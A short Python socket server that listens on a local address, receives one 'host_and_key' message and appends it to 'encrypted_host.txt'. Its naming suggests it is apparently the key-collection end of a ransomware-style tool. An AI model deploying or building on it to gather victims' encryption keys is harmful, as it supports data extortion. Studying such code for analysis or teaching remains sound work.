import socket

IP_ADDRESS = "192.168.43.94"
PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print("listening for connection")
    s.listen(1)
    conn, addr = s.accept()
    print("connetion from {} established".format(addr))
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open("encrypted_host.txt","a") as f:
                f.write(host_and_key+"\n")
            break
        print("connection complate and closed")
